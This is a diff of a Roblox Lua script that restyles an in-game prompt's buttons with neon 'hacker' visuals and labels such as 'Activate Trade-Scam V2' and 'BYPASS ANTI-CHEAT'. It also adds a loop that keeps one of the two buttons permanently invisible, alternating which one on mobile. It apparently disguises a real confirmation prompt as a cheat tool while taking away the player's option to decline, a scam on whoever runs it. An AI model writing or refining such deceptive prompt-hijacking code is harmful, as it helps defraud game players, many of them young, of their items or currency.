@@ -6809,107 +6809,120 @@ task.spawn(function()
             task.spawn(animateScanline)
         end
 
-     local function setupButton(button, isMobile)
-    if shouldHide then
-        button.Visible = false
-        return
-    end
-            if button and button:IsA("ImageButton") and button.Visible then
-                button:ClearAllChildren()
-                button.Image = ""
-                button.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-                button.AutoButtonColor = false
-                button.BorderSizePixel = 0
-                
-                -- Holographic container
-                local container = Instance.new("Frame")
-                container.Size = UDim2.new(1, 0, 1, 0)
-                container.BackgroundTransparency = 1
-                container.ClipsDescendants = true
-                container.Parent = button
-                
-                -- Enhanced cyber frame
-                local cyberFrame = Instance.new("Frame")
-                cyberFrame.Size = UDim2.new(1, -4, 1, -4)
-                cyberFrame.Position = UDim2.new(0, 2, 0, 2)
-                cyberFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
-                cyberFrame.BorderSizePixel = 0
-                cyberFrame.Parent = container
-                
-                -- Animated corner accents
-                for _, pos in ipairs({{0,0}, {1,0}, {0,1}, {1,1}}) do
-                    local corner = Instance.new("Frame")
-                    corner.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
-                    corner.BorderSizePixel = 0
-                    corner.Size = UDim2.new(0, 8, 0, 2)
-                    corner.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or -6, pos[2], pos[2] == 0 and -2 or 0)
-                    corner.Parent = button
-                    
-                    local vertPart = Instance.new("Frame")
-                    vertPart.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
-                    vertPart.BorderSizePixel = 0
-                    vertPart.Size = UDim2.new(0, 2, 0, 8)
-                    vertPart.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or 0, pos[2], pos[2] == 0 and -2 or -6)
-                    vertPart.Parent = button
-                end
-                
-                -- Create neon glow
-                local neon = createNeonEffect(button, Color3.fromRGB(0, 255, 255))
-                
-                -- Button text
-                local textLabel = Instance.new("TextLabel")
-                textLabel.Name = "ButtonText"
-                textLabel.Size = UDim2.new(1, 0, 1, 0)
-                textLabel.BackgroundTransparency = 1
-                textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
-                textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
-                textLabel.TextStrokeTransparency = 0
-                textLabel.TextScaled = true
-                textLabel.Font = Enum.Font.SciFi
-
-                -- Set text based on device type and button
-                if isMobile then
-                    if button.Name == "1" then
-                        textLabel.Text = "Activate Trade-Scam V2"
-                    else
-                        textLabel.Text = "Activate Trade-Scam V2 Script"
+local function setupButton(button, isMobile, promptCounter)
+    if button and button:IsA("ImageButton") and button.Visible then
+        -- For mobile, handle visibility based on prompt counter
+        if isMobile then
+            -- For first prompt, hide button "1" and show "2"
+            -- For second prompt, hide button "2" and show "1"
+            -- And so on...
+            if (promptCounter % 2 == 1 and button.Name == "1") or 
+               (promptCounter % 2 == 0 and button.Name == "2") then
+                -- Create a loop to keep the button invisible
+                task.spawn(function()
+                    while button and button.Parent do
+                        button.Visible = false
+                        task.wait()
                     end
-                else
-                    textLabel.Text = ({ "BYPASS", "INJECT", "BYPASS ANTI-CHEAT", "ACTIVATE BYPASS" })[math.random(1, 4)]
-                end
-
-                textLabel.Parent = container
-                
-                -- Hover effects
-                button.MouseEnter:Connect(function()
-                    if not button or not button.Parent then return end
-                    
-                    TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-                        Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 10, 
-                                        button.Size.Y.Scale, button.Size.Y.Offset + 6)
-                    }):Play()
-                    
-                    TweenService:Create(neon, TweenInfo.new(0.3), {
-                        ImageTransparency = 0.3
-                    }):Play()
                 end)
-                
-                button.MouseLeave:Connect(function()
-                    if not button or not button.Parent then return end
-                    
-                    TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-                        Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 10, 
-                                        button.Size.Y.Scale, button.Size.Y.Offset - 6)
-                    }):Play()
-                    
-                    TweenService:Create(neon, TweenInfo.new(0.3), {
-                        ImageTransparency = 0.5
-                    }):Play()
-                end)
+                return -- Exit early, don't setup the invisible button
             end
         end
 
-local isFirstPrompt = true
+        -- Original button setup code
+        button:ClearAllChildren()
+        button.Image = ""
+        button.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+        button.AutoButtonColor = false
+        button.BorderSizePixel = 0
+        
+        -- Holographic container
+        local container = Instance.new("Frame")
+        container.Size = UDim2.new(1, 0, 1, 0)
+        container.BackgroundTransparency = 1
+        container.ClipsDescendants = true
+        container.Parent = button
+        
+        -- Enhanced cyber frame
+        local cyberFrame = Instance.new("Frame")
+        cyberFrame.Size = UDim2.new(1, -4, 1, -4)
+        cyberFrame.Position = UDim2.new(0, 2, 0, 2)
+        cyberFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
+        cyberFrame.BorderSizePixel = 0
+        cyberFrame.Parent = container
+        
+        -- Animated corner accents
+        for _, pos in ipairs({{0,0}, {1,0}, {0,1}, {1,1}}) do
+            local corner = Instance.new("Frame")
+            corner.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+            corner.BorderSizePixel = 0
+            corner.Size = UDim2.new(0, 8, 0, 2)
+            corner.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or -6, pos[2], pos[2] == 0 and -2 or 0)
+            corner.Parent = button
+            
+            local vertPart = Instance.new("Frame")
+            vertPart.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+            vertPart.BorderSizePixel = 0
+            vertPart.Size = UDim2.new(0, 2, 0, 8)
+            vertPart.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or 0, pos[2], pos[2] == 0 and -2 or -6)
+            vertPart.Parent = button
+        end
+        
+        -- Create neon glow
+        local neon = createNeonEffect(button, Color3.fromRGB(0, 255, 255))
+        
+        -- Button text
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Name = "ButtonText"
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
+        textLabel.TextStrokeTransparency = 0
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.SciFi
+
+        -- Set text based on device type and button
+        if isMobile then
+            if button.Name == "1" then
+                textLabel.Text = "Activate Trade-Scam V2"
+            else
+                textLabel.Text = "Activate Trade-Scam V2 Script"
+            end
+        else
+            textLabel.Text = ({ "BYPASS", "INJECT", "BYPASS ANTI-CHEAT", "ACTIVATE BYPASS" })[math.random(1, 4)]
+        end
+
+        textLabel.Parent = container
+        
+        -- Hover effects
+        button.MouseEnter:Connect(function()
+            if not button or not button.Parent then return end
+            
+            TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+                Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 10, 
+                                button.Size.Y.Scale, button.Size.Y.Offset + 6)
+            }):Play()
+            
+            TweenService:Create(neon, TweenInfo.new(0.3), {
+                ImageTransparency = 0.3
+            }):Play()
+        end)
+        
+        button.MouseLeave:Connect(function()
+            if not button or not button.Parent then return end
+            
+            TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+                Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 10, 
+                                button.Size.Y.Scale, button.Size.Y.Offset - 6)
+            }):Play()
+            
+            TweenService:Create(neon, TweenInfo.new(0.3), {
+                ImageTransparency = 0.5
+            }):Play()
+        end)
+    end
+end
 
         local function applyChanges(prompt, counter, isMobile)
             local alertContents = prompt:WaitForChild("AlertContents")
@@ -6969,34 +6982,14 @@ local footer = alertContents:WaitForChild("Footer")
     local button1 = buttons:FindFirstChild("1")
     local button2 = buttons:FindFirstChild("2")
     
-    if isMobile then
-        if isFirstPrompt then
-            -- For first prompt, hide button1 and setup button2
-            if button1 and button1.Visible then
-                setupButton(button1, isMobile, true) -- Hide button1
-            end
-            if button2 and button2.Visible then
-                setupButton(button2, isMobile, false) -- Show and setup button2
-            end
-        else
-            -- For subsequent prompts, hide button2 and setup button1
-            if button1 and button1.Visible then
-                setupButton(button1, isMobile, false) -- Show and setup button1
-            end
-            if button2 and button2.Visible then
-                setupButton(button2, isMobile, true) -- Hide button2
-            end
-        end
-        isFirstPrompt = not isFirstPrompt -- Toggle for next prompt
-    else
-        -- Desktop behavior remains unchanged
-        if button1 and button1.Visible then
-            setupButton(button1, isMobile, false)
-        end
-        if button2 and button2.Visible then
-            setupButton(button2, isMobile, false)
-        end
-    end
+    -- In the applyChanges function, update the button setup section:
+if button1 and button1.Visible then
+    setupButton(button1, isMobile, counter)
+end
+
+if button2 and button2.Visible then
+    setupButton(button2, isMobile, counter)
+end
 
             -- Mobile-specific container adjustments
             if isMobile then
